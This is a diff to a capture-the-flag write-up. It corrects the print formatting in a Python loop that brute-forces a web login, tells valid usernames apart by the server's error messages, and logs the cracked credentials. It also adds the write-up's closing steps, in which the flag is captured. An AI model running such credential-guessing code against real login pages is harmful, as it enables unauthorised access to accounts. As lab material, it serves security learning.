@@ -94,15 +94,24 @@ response = session.post(url, data=data)
 ```
 print("[*] Attempting Password: %s for User: %s" % (password, username))
     if 'does not exist' not in response.text:
-        print("[*]Username: %s is valid", username)
+        print("[*]Username: %s is valid" % username)
 
         if 'Invalid password' not in response.text:
-            print("[*]Password: %s is correct", password)
+            print("[*]Password: %s is correct"% password)
             log = open('logs.txt', 'w')
-            log.write(username +""+ password)
+            log.write(username +" "+ password)
             exit()
         else:
             print("[*]The Password is invalid")
     else:
       break
 ```
+## 7️⃣ Finally found the username and password
+
+![alt text](<Screenshot From 2025-04-21 03-15-13.png>)
+
+A small syntax error on the code but have corrected it.
+
+## 8️⃣ Captured the flag successfully
+
+![alt text](<Screenshot From 2025-04-21 03-08-07.png>)
